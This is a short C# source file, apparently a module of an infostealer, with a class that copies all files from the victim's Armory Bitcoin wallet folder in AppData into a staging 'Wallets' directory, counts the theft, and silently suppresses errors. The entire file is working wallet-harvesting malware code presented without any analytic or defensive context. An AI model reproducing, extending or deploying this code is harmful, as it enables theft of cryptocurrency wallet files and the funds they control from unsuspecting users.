using System.IO;

namespace SHARP
{
    internal class Armory
    {
      private static readonly string ArmoryDir = "\\Wallets\\Armory\\";

      public static void ArmoryStr(string directorypath)
      {
        try
        {
          foreach (FileInfo file in new DirectoryInfo(Help.AppData + "\\Armory\\").GetFiles())
          {
            Directory.CreateDirectory(directorypath + Armory.ArmoryDir);
            file.CopyTo(directorypath + Armory.ArmoryDir + file.Name);
          }
          ++Counting.armory;
          ++Counting.Wallets;
        }
        catch
        {
        }
      }
    }
}
